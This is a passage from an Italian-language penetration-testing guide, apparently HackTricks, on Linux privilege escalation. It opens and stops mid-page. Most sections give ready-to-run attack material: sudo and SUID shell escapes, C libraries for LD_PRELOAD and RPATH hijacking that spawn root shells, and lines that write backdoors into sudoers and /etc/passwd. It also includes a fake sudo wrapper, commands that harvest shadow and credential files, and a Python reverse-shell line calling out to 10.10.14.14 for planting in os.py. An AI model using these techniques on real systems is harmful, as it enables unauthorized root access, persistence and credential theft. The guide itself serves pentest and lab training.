[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) con il parametro `-a` prova anche a forzare l'accesso agli utenti.

## Writable PATH abuses

### $PATH

Se scopri che puoi **scrivere all'interno di qualche cartella del $PATH** potresti essere in grado di elevare i privilegi **creando una backdoor all'interno della cartella scrivibile** con il nome di qualche comando che verrà eseguito da un altro utente (idealmente root) e che **non è caricato da una cartella che si trova prima** della tua cartella scrivibile in $PATH.

### SUDO e SUID

Potresti essere autorizzato a eseguire qualche comando usando sudo o potrebbero avere il bit suid. Controllalo usando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Alcuni **comandi inaspettati ti consentono di leggere e/o scrivere file o persino eseguire un comando.** Ad esempio:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configurazione di Sudo potrebbe consentire a un utente di eseguire alcuni comandi con i privilegi di un altro utente senza conoscere la password.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In questo esempio, l'utente `demo` può eseguire `vim` come `root`, ora è banale ottenere una shell aggiungendo una chiave ssh nella directory root o chiamando `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Questa direttiva consente all'utente di **impostare una variabile di ambiente** durante l'esecuzione di qualcosa:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Questo esempio, **basato sulla macchina HTB Admirer**, era **vulnerabile** all'**hijacking di PYTHONPATH** per caricare una libreria python arbitraria durante l'esecuzione dello script come root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo execution bypassing paths

**Salta** per leggere altri file o usa **symlinks**. Ad esempio nel file sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Se viene utilizzato un **wildcard** (\*), è ancora più facile:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contromisure**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando Sudo/Binary SUID senza percorso del comando

Se il **permesso sudo** è dato a un singolo comando **senza specificare il percorso**: _hacker10 ALL= (root) less_ puoi sfruttarlo cambiando la variabile PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Questa tecnica può essere utilizzata anche se un **suid** binary **esegue un altro comando senza specificare il percorso (controlla sempre con** _**strings**_ **il contenuto di un strano SUID binary)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary con percorso del comando

Se il **suid** binary **esegue un altro comando specificando il percorso**, allora puoi provare a **esportare una funzione** chiamata come il comando che il file suid sta chiamando.

Ad esempio, se un binary suid chiama _**/usr/sbin/service apache2 start**_ devi provare a creare la funzione ed esportarla:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Poi, quando chiami il binario suid, questa funzione verrà eseguita

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variabile di ambiente **LD_PRELOAD** viene utilizzata per specificare una o più librerie condivise (.so files) da caricare dal loader prima di tutte le altre, inclusa la libreria C standard (`libc.so`). Questo processo è noto come preloading di una libreria.

Tuttavia, per mantenere la sicurezza del sistema e prevenire che questa funzionalità venga sfruttata, in particolare con eseguibili **suid/sgid**, il sistema impone determinate condizioni:

- Il loader ignora **LD_PRELOAD** per eseguibili in cui l'ID utente reale (_ruid_) non corrisponde all'ID utente efficace (_euid_).
- Per eseguibili con suid/sgid, solo le librerie nei percorsi standard che sono anche suid/sgid vengono preloaded.

L'escalation dei privilegi può verificarsi se hai la possibilità di eseguire comandi con `sudo` e l'output di `sudo -l` include l'affermazione **env_keep+=LD_PRELOAD**. Questa configurazione consente alla variabile di ambiente **LD_PRELOAD** di persistere e di essere riconosciuta anche quando i comandi vengono eseguiti con `sudo`, portando potenzialmente all'esecuzione di codice arbitrario con privilegi elevati.
```
Defaults        env_keep += LD_PRELOAD
```
Salva come **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Poi **compilalo** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Infine, **escalare i privilegi** eseguendo
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Un privesc simile può essere abusato se l'attaccante controlla la variabile di ambiente **LD_LIBRARY_PATH** perché controlla il percorso in cui verranno cercate le librerie.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Quando si incontra un binario con permessi **SUID** che sembra insolito, è buona pratica verificare se sta caricando correttamente i file **.so**. Questo può essere controllato eseguendo il seguente comando:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Ad esempio, incontrare un errore come _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (Nessun file o directory di questo tipo)"_ suggerisce un potenziale per l'exploitation.

Per sfruttare questo, si procederebbe creando un file C, ad esempio _"/path/to/.config/libcalc.c"_, contenente il seguente codice:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Questo codice, una volta compilato ed eseguito, mira ad elevare i privilegi manipolando i permessi dei file ed eseguendo una shell con privilegi elevati.

Compila il file C sopra in un file oggetto condiviso (.so) con:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Infine, l'esecuzione del binario SUID interessato dovrebbe attivare l'exploit, consentendo un potenziale compromesso del sistema.

## Hijacking di Oggetti Condivisi
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Ora che abbiamo trovato un binario SUID che carica una libreria da una cartella in cui possiamo scrivere, creiamo la libreria in quella cartella con il nome necessario:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Se ricevi un errore come
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
significa che la libreria che hai generato deve avere una funzione chiamata `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) è un elenco curato di binari Unix che possono essere sfruttati da un attaccante per bypassare le restrizioni di sicurezza locali. [**GTFOArgs**](https://gtfoargs.github.io/) è lo stesso ma per i casi in cui puoi **iniettare solo argomenti** in un comando.

Il progetto raccoglie funzioni legittime di binari Unix che possono essere abusate per uscire da shell ristrette, elevare o mantenere privilegi elevati, trasferire file, generare shell bind e reverse, e facilitare altre attività post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}

{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Se puoi accedere a `sudo -l` puoi usare lo strumento [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) per controllare se trova come sfruttare qualsiasi regola sudo.

### Riutilizzo dei Token Sudo

Nei casi in cui hai **accesso sudo** ma non la password, puoi elevare i privilegi **aspettando l'esecuzione di un comando sudo e poi dirottando il token di sessione**.

Requisiti per elevare i privilegi:

- Hai già una shell come utente "_sampleuser_"
- "_sampleuser_" ha **usato `sudo`** per eseguire qualcosa negli **ultimi 15 minuti** (per impostazione predefinita è la durata del token sudo che ci consente di usare `sudo` senza inserire alcuna password)
- `cat /proc/sys/kernel/yama/ptrace_scope` è 0
- `gdb` è accessibile (puoi essere in grado di caricarlo)

(Puoi abilitare temporaneamente `ptrace_scope` con `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` o modificarlo permanentemente in `/etc/sysctl.d/10-ptrace.conf` impostando `kernel.yama.ptrace_scope = 0`)

Se tutti questi requisiti sono soddisfatti, **puoi elevare i privilegi usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Il **primo exploit** (`exploit.sh`) creerà il binario `activate_sudo_token` in _/tmp_. Puoi usarlo per **attivare il token sudo nella tua sessione** (non otterrai automaticamente una shell root, fai `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Il **secondo exploit** (`exploit_v2.sh`) creerà una shell sh in _/tmp_ **possessa da root con setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Il **terzo exploit** (`exploit_v3.sh`) creerà un file sudoers che rende **eterni i token sudo e consente a tutti gli utenti di utilizzare sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Se hai **permessi di scrittura** nella cartella o su uno dei file creati all'interno della cartella, puoi utilizzare il binario [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) per **creare un token sudo per un utente e un PID**.\
Ad esempio, se puoi sovrascrivere il file _/var/run/sudo/ts/sampleuser_ e hai una shell come quell'utente con PID 1234, puoi **ottenere privilegi sudo** senza bisogno di conoscere la password eseguendo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Il file `/etc/sudoers` e i file all'interno di `/etc/sudoers.d` configurano chi può usare `sudo` e come. Questi file **di default possono essere letti solo dall'utente root e dal gruppo root**.\
**Se** puoi **leggere** questo file potresti essere in grado di **ottenere alcune informazioni interessanti**, e se puoi **scrivere** qualsiasi file sarai in grado di **escalare i privilegi**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Se puoi scrivere, puoi abusare di questo permesso.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Un altro modo per abusare di questi permessi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Ci sono alcune alternative al binario `sudo` come `doas` per OpenBSD, ricorda di controllare la sua configurazione in `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Se sai che un **utente di solito si connette a una macchina e utilizza `sudo`** per elevare i privilegi e hai ottenuto una shell all'interno di quel contesto utente, puoi **creare un nuovo eseguibile sudo** che eseguirà il tuo codice come root e poi il comando dell'utente. Poi, **modifica il $PATH** del contesto utente (ad esempio aggiungendo il nuovo percorso in .bash_profile) in modo che quando l'utente esegue sudo, il tuo eseguibile sudo venga eseguito.

Nota che se l'utente utilizza una shell diversa (non bash) dovrai modificare altri file per aggiungere il nuovo percorso. Ad esempio[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Puoi trovare un altro esempio in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

O eseguendo qualcosa come:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Il file `/etc/ld.so.conf` indica **da dove provengono i file di configurazione caricati**. Tipicamente, questo file contiene il seguente percorso: `include /etc/ld.so.conf.d/*.conf`

Ciò significa che i file di configurazione di `/etc/ld.so.conf.d/*.conf` verranno letti. Questi file di configurazione **puntano ad altre cartelle** dove **le librerie** verranno **cercate**. Ad esempio, il contenuto di `/etc/ld.so.conf.d/libc.conf` è `/usr/local/lib`. **Questo significa che il sistema cercherà le librerie all'interno di `/usr/local/lib`**.

Se per qualche motivo **un utente ha permessi di scrittura** su uno dei percorsi indicati: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, qualsiasi file all'interno di `/etc/ld.so.conf.d/` o qualsiasi cartella all'interno del file di configurazione in `/etc/ld.so.conf.d/*.conf`, potrebbe essere in grado di elevare i privilegi.\
Dai un'occhiata a **come sfruttare questa misconfigurazione** nella pagina seguente:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Copiare la lib in `/var/tmp/flag15/` verrà utilizzata dal programma in questo luogo come specificato nella variabile `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Poi crea una libreria maligna in `/var/tmp` con `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacità

Le capacità di Linux forniscono un **sottoinsieme dei privilegi di root disponibili a un processo**. Questo rompe efficacemente i privilegi di root **in unità più piccole e distintive**. Ognuna di queste unità può quindi essere concessa indipendentemente ai processi. In questo modo, l'insieme completo di privilegi è ridotto, diminuendo i rischi di sfruttamento.\
Leggi la pagina seguente per **scoprire di più sulle capacità e su come abusarne**:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Permessi delle directory

In una directory, il **bit per "eseguire"** implica che l'utente interessato può "**cd**" nella cartella.\
Il bit **"leggi"** implica che l'utente può **elencare** i **file**, e il bit **"scrivi"** implica che l'utente può **cancellare** e **creare** nuovi **file**.

## ACL

Le Liste di Controllo degli Accessi (ACL) rappresentano il secondo livello di permessi discrezionali, capaci di **sovrascrivere i tradizionali permessi ugo/rwx**. Questi permessi migliorano il controllo sull'accesso ai file o alle directory consentendo o negando diritti a utenti specifici che non sono i proprietari o parte del gruppo. Questo livello di **granularità garantisce una gestione degli accessi più precisa**. Ulteriori dettagli possono essere trovati [**qui**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dai** all'utente "kali" permessi di lettura e scrittura su un file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Ottieni** file con ACL specifiche dal sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Aprire sessioni shell

In **vecchie versioni** potresti **dirottare** alcune sessioni **shell** di un altro utente (**root**).\
Nelle **versioni più recenti** sarai in grado di **connetterti** solo alle sessioni screen del **tuo utente**. Tuttavia, potresti trovare **informazioni interessanti all'interno della sessione**.

### Dirottamento delle sessioni screen

**Elenca le sessioni screen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Collegati a una sessione**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Questo era un problema con **vecchie versioni di tmux**. Non sono riuscito a hijackare una sessione tmux (v2.1) creata da root come utente non privilegiato.

**Elenca le sessioni tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Collegati a una sessione**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Controlla **Valentine box from HTB** per un esempio.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Tutte le chiavi SSL e SSH generate su sistemi basati su Debian (Ubuntu, Kubuntu, ecc.) tra settembre 2006 e il 13 maggio 2008 potrebbero essere affette da questo bug.\
Questo bug è causato dalla creazione di una nuova chiave ssh in quegli OS, poiché **erano possibili solo 32.768 variazioni**. Ciò significa che tutte le possibilità possono essere calcolate e **avendo la chiave pubblica ssh puoi cercare la corrispondente chiave privata**. Puoi trovare le possibilità calcolate qui: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Valori di configurazione SSH interessanti

- **PasswordAuthentication:** Specifica se l'autenticazione tramite password è consentita. Il valore predefinito è `no`.
- **PubkeyAuthentication:** Specifica se l'autenticazione tramite chiave pubblica è consentita. Il valore predefinito è `yes`.
- **PermitEmptyPasswords**: Quando l'autenticazione tramite password è consentita, specifica se il server consente l'accesso a account con stringhe di password vuote. Il valore predefinito è `no`.

### PermitRootLogin

Specifica se root può accedere utilizzando ssh, il valore predefinito è `no`. Valori possibili:

- `yes`: root può accedere utilizzando password e chiave privata
- `without-password` o `prohibit-password`: root può accedere solo con una chiave privata
- `forced-commands-only`: Root può accedere solo utilizzando la chiave privata e se le opzioni dei comandi sono specificate
- `no` : no

### AuthorizedKeysFile

Specifica i file che contengono le chiavi pubbliche che possono essere utilizzate per l'autenticazione dell'utente. Può contenere token come `%h`, che verranno sostituiti dalla home directory. **Puoi indicare percorsi assoluti** (che iniziano con `/`) o **percorsi relativi dalla home dell'utente**. Ad esempio:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Quella configurazione indicherà che se provi a effettuare il login con la chiave **privata** dell'utente "**testusername**", ssh confronterà la chiave pubblica della tua chiave con quelle situate in `/home/testusername/.ssh/authorized_keys` e `/home/testusername/access`.

### ForwardAgent/AllowAgentForwarding

Il forwarding dell'agente SSH ti consente di **utilizzare le tue chiavi SSH locali invece di lasciare le chiavi** (senza passphrase!) sul tuo server. Quindi, sarai in grado di **saltare** via ssh **verso un host** e da lì **saltare verso un altro** host **utilizzando** la **chiave** situata nel tuo **host iniziale**.

Devi impostare questa opzione in `$HOME/.ssh.config` in questo modo:
```
Host example.com
ForwardAgent yes
```
Nota che se `Host` è `*` ogni volta che l'utente passa a una macchina diversa, quell'host sarà in grado di accedere alle chiavi (il che è un problema di sicurezza).

Il file `/etc/ssh_config` può **sovrascrivere** queste **opzioni** e consentire o negare questa configurazione.\
Il file `/etc/sshd_config` può **consentire** o **negare** il forwarding dell'ssh-agent con la parola chiave `AllowAgentForwarding` (il valore predefinito è consentito).

Se scopri che il Forward Agent è configurato in un ambiente leggi la seguente pagina in quanto **potresti essere in grado di abusarne per escalare i privilegi**:

{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## File Interessanti

### File di profilo

Il file `/etc/profile` e i file sotto `/etc/profile.d/` sono **script che vengono eseguiti quando un utente avvia una nuova shell**. Pertanto, se puoi **scrivere o modificare uno di essi puoi escalare i privilegi**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Se viene trovato un script di profilo strano, dovresti controllarlo per **dettagli sensibili**.

### File Passwd/Shadow

A seconda del sistema operativo, i file `/etc/passwd` e `/etc/shadow` potrebbero avere un nome diverso o potrebbe esserci un backup. Pertanto, è consigliato **trovare tutti** e **controllare se puoi leggerli** per vedere **se ci sono hash** all'interno dei file:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In alcune occasioni puoi trovare **password hashes** all'interno del file `/etc/passwd` (o equivalente)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

Prima di tutto, genera una password con uno dei seguenti comandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Quindi aggiungi l'utente `hacker` e aggiungi la password generata.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Puoi ora utilizzare il comando `su` con `hacker:hacker`

In alternativa, puoi utilizzare le seguenti righe per aggiungere un utente fittizio senza password.\
ATTENZIONE: potresti compromettere la sicurezza attuale della macchina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: Sulle piattaforme BSD, `/etc/passwd` si trova in `/etc/pwd.db` e `/etc/master.passwd`, inoltre `/etc/shadow` è rinominato in `/etc/spwd.db`.

Dovresti controllare se puoi **scrivere in alcuni file sensibili**. Ad esempio, puoi scrivere in qualche **file di configurazione del servizio**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Ad esempio, se la macchina sta eseguendo un server **tomcat** e puoi **modificare il file di configurazione del servizio Tomcat all'interno di /etc/systemd/,** allora puoi modificare le righe:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Il tuo backdoor verrà eseguito la prossima volta che tomcat verrà avviato.

### Controlla le Cartelle

Le seguenti cartelle potrebbero contenere backup o informazioni interessanti: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probabilmente non sarai in grado di leggere l'ultima, ma prova)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Posizioni strane/File di proprietà
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### File modificati negli ultimi minuti
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### File DB Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_storia, .sudo_as_admin_successful, profilo, bashrc, httpd.conf, .piano, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml file
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### File nascosti
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries nel PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **File web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Backup**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### File noti contenenti password

Leggi il codice di [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), cerca **diversi file possibili che potrebbero contenere password**.\
**Un altro strumento interessante** che puoi usare per farlo è: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) che è un'applicazione open source utilizzata per recuperare molte password memorizzate su un computer locale per Windows, Linux e Mac.

### Log

Se puoi leggere i log, potresti essere in grado di trovare **informazioni interessanti/confidenziali al loro interno**. Più strano è il log, più interessante sarà (probabilmente).\
Inoltre, alcuni log di **audit** **"mal"** configurati (backdoored?) potrebbero permetterti di **registrare password** all'interno dei log di audit come spiegato in questo post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Per **leggere i log il gruppo** [**adm**](interesting-groups-linux-pe/index.html#adm-group) sarà davvero utile.

### File shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Dovresti anche controllare i file che contengono la parola "**password**" nel suo **nome** o all'interno del **contenuto**, e controllare anche per IP ed email all'interno dei log, o regex per hash.\
Non elencherò qui come fare tutto questo, ma se sei interessato puoi controllare gli ultimi controlli che [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) esegue.

## Writable files

### Python library hijacking

Se sai da **dove** verrà eseguito uno script python e **puoi scrivere all'interno** di quella cartella o puoi **modificare le librerie python**, puoi modificare la libreria OS e inserirvi un backdoor (se puoi scrivere dove verrà eseguito lo script python, copia e incolla la libreria os.py).

Per **inserire un backdoor nella libreria** basta aggiungere alla fine della libreria os.py la seguente riga (cambia IP e PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Una vulnerabilità in `logrotate` consente agli utenti con **permessi di scrittura** su un file di log o le sue directory padre di potenzialmente ottenere privilegi elevati. Questo perché `logrotate`, che spesso viene eseguito come **root**, può essere manipolato per eseguire file arbitrari, specialmente in directory come _**/etc/bash_completion.d/**_. È importante controllare i permessi non solo in _/var/log_ ma anche in qualsiasi directory in cui viene applicata la rotazione dei log.

> [!NOTE]
> Questa vulnerabilità colpisce `logrotate` versione `3.18.0` e versioni precedenti

Informazioni più dettagliate sulla vulnerabilità possono essere trovate su questa pagina: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Puoi sfruttare questa vulnerabilità con [**logrotten**](https://github.com/whotwagner/logrotten).

Questa vulnerabilità è molto simile a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(log di nginx),** quindi ogni volta che scopri di poter alterare i log, controlla chi gestisce quei log e verifica se puoi ottenere privilegi elevati sostituendo i log con symlink.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

